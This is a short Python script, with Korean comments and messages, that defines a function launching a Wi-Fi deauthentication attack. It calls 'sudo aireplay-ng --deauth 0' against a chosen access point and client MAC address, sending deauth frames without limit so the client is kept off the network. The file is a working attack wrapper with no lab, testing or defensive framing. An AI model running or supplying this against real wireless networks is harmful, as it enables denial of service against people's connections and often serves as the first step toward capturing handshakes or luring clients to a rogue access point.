import subprocess

# Deauth 공격을 실행하는 함수
def deauth_attack(target_mac, ap_mac, interface):
    try:
        # deauth 공격 명령어
        print(f"Deauth 공격 시작: {target_mac} (Client) -> {ap_mac} (AP) ")
        subprocess.run(['sudo', 'aireplay-ng', '--deauth', '0', '-a', ap_mac, '-c', target_mac, interface])
    except Exception as e:
        print(f"Deauth 공격 중 오류 발생: {e}")
